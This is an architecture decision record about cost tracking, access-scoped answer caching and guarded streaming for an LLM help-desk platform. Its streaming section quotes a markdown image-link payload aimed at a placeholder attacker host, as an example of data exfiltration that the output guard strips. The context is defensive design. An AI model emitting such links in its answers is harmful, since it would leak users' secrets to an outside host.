# ADR 0013: Cost and performance

- Status: Accepted
- Date: 2026-11-01

## Context

Model calls are the platform's main running cost, and each one takes seconds. Three things reduce
that: knowing what each tenant spends (so it can be limited and charged), not paying for an answer
that was already given, and showing an answer while it is still being written.

Each of them collides with something we already built. A cache that shares answers between people
collides with access control: the whole platform is built so that nobody reads what their role does
not allow (ADRs 0006, 0007), and a cache is a machine for handing one person's answer to another.
Streaming collides with the output checks (ADR 0010): they run on a finished answer, and a card
number is already on the reader's screen if the check waits for the end.

## Decisions

### 1. Price every call and track spend per tenant, honestly

Prices are dollars per million tokens per deployment, so a token times its price is already in
micro-dollars and every amount is an integer that sums without drift. Each response carries its cost;
spend is summed per tenant, day and deployment and shown to people with the `cost-viewer` role for
their own tenant only. An optional daily budget refuses a tenant that has spent it (as with the token
quota, in-flight calls can overshoot it).

Two cases are counted openly instead of hidden. A deployment with no price on file is **unpriced**, not
free. A stream that ended early (the reader left, the connection broke) is billed as an **estimate** and
marked as one, because the deployment still charged for what it generated.

### 2. The answer cache lives in the assistant, keyed by what the model was given

A cache in the gateway would see only a prompt and could not know which user may see which part of it.
The assistant knows. An entry is stored only after every guardrail and citation check has passed, and is
offered only to a request with the **same tenant and the same fingerprint of what the model would be
given**: the sources retrieved for this user, by content and in order, the prompt version, the
guardrail mode and a manual epoch. The consequences are the point:

- A user shown different documents (a restricted one trimmed away, or added) has a different
  fingerprint and gets no hit, whichever of two people asked first. Retrieval runs on every request, so
  access is still decided by retrieval; the cache cannot bypass it.
- A document that was edited changes the fingerprint (by content, not id), so a stale answer is never
  served and old entries simply age out. A new prompt version, or the other arm of an A/B test, does too.
- Tenants never share, and a restricted answer is never stored under a key a less-privileged user can
  reach.

What a hit saves is the model call and its latency. Retrieval and prompt resolution still happen.

### 3. "Semantic" here means wording, with a guard, and the limits are written down

Questions are compared by a vector of their content words and word pairs (case, punctuation and word
forms folded). That catches the same question asked differently, which is most repetition in a help
desk, but not two differently worded questions that mean the same, which needs a real embedding model
behind the same interface. Similarity alone cannot be trusted with small words, so a hit also requires
that both questions share **exactly** every number, identifier and meaning-flipping word (not, before,
after, open, close, maximum, minimum, German equivalents...). "Can I block my card" and "can I not block
my card" are one word apart and opposite; so are 150 and 200 euros. The tests include long questions
whose vectors are above the threshold and that only the guard separates.

**Limit:** one changed word that is not in that list (an entity, a department) in a long question barely
moves the vector and can produce a wrong hit. The scope bounds the damage to "an answer to a slightly
different question, grounded in the same sources", and shadow mode (next) is how to measure it.

### 4. Roll it out in shadow mode first, and report what it did

`CACHE_MODE` is `off` (the default), `shadow` or `serve`. In shadow mode every request is answered
freshly and the cache only records whether it would have hit and whether its answer matched the fresh
one, so the hit rate and the error rate are known on real traffic before anyone is served from it. Hits
report what they saved (tokens and dollars), and a `noCache` flag asks for a fresh answer.

### 5. Stream the answer through a guard, not around it

`stream: true` delivers `meta`, text pieces and a final `done`. The final event carries the verified
answer (citations checked) and a `replace` flag saying whether it differs from what was streamed, so
clients show the final text. Every refusal (a guardrail, a limit, a dependency down) is decided before
the first byte and still arrives as an ordinary JSON error. What makes the pieces safe to send:

- **The tail is held back.** Text goes out only once at least `STREAM_HOLDBACK_CHARS` (120) characters
  follow it, longer than anything a check must see whole (a card number, an IBAN, the canary, eight
  words of the instructions), so a pattern split across chunks is complete before any of it leaves.
- **An unfinished link, image or tag is held from its first character, however long it runs.**
  `![x](https://evil.example/?d=<secret>` is removed, not redacted, once it closes, so it must never be
  sent half-written.
- **Every check is re-run over everything received so far**, and what has been sent must always be the
  start of the finished, cleaned answer. If that ever fails, nothing more is sent. A leak (the canary or
  a verbatim run of the instructions) stops the stream and **hangs up on the model**, saving the rest of
  the generation.

Property tests check 300 random chunkings of answers containing cards, secrets, IBANs, long image links,
links, tags and citation markers: the output always equals the finished answer, and no sensitive
fragment is ever in what has been sent so far. **Cost: latency.** Nothing is sent until the hold-back is
filled, so an answer shorter than it arrives all at once, and the hold-back is a dial between safety and
speed.

### 6. Streaming from the gateway: fail over early, bill honestly

The gateway streams server-sent events with usage and cost in the closing event. Retry and fallback work
up to the first piece of text; after that a deployment that fails fails the stream rather than starting a
second answer after the first. A client that hangs up stops the upstream call (the deployment stops
generating, and billing). The Azure client reads usage from the stream and cuts one that goes quiet, not
one that is merely long.

## Proof

An end-to-end benchmark runs one workload of 120 requests (70% repeat questions in several wordings, 30%
unique) three times against the real services: cache off, shadow, and serving. Serving made 65% fewer
model calls and spent 64% less; the median wait for the first text fell from about 75 ms to about 6 ms;
shadow mode found every answer it would have served identical to a fresh one; and none of eight pairs
that differ by one word and mean something else was treated as the same (8 of 9 rewordings were).
Breaking each safeguard on purpose (the fingerprint ignoring sources, document text or prompt version,
the cache ignoring the tenant, the number/negation guard, shadow mode serving, `noCache`, the hold-back,
unfinished-link holding, the leak check, hanging up on the model, the replace flag, the gateway recording
spend) fails the tests written for it.

## Consequences

- The cache, its counters and the spend records are **in memory**: lost on restart and per process.
  Production needs Redis (with vector search) for the cache and a metrics store for spend.
- The benchmark uses a deterministic stand-in model, illustrative prices and a synthetic workload. It
  shows what the platform does with traffic like that, not what real traffic or a real model would give;
  real hit rates depend on how repetitive real questions are, which shadow mode exists to find out.
- A cached answer does not reflect a better model or a re-ranked index until its TTL (default one hour)
  expires or the epoch is bumped.
- Spend is per tenant, by deployment, by day. There is no per-user, per-feature or per-agent breakdown,
  and prices are a manually maintained table.
- Streaming holds the first 120 or so characters back, so it helps long answers most. A failure after the
  stream began leaves partial text on screen and ends with an `error` event. The Azure streaming client
  has only been tested against recorded responses, not real Azure.
- The agents do not use the cache or streaming. Their prompts include tool results and run state, which
  would need their own scope.
